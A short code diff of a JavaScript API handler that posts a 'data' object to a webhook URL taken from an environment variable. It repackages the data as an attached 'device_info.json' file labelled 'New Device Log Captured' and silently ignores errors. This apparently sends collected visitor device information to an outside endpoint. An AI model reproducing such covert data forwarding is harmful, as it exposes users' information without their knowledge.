@@ -18,12 +18,13 @@ export default async function handler(req, res) {
   const url = process.env.wu;
   if (url && req.method === 'POST') {
     try {
+      const formData = new FormData();
+      const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+      formData.append('file', blob, 'device_info.json');
+      formData.append('payload_json', JSON.stringify({ content: "New Device Log Captured" }));
       await fetch(url, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          content: "```json\n" + JSON.stringify(data, null, 2) + "\n```"
-        }),
+        body: formData,
         keepalive: true
       });
     } catch (err) {}
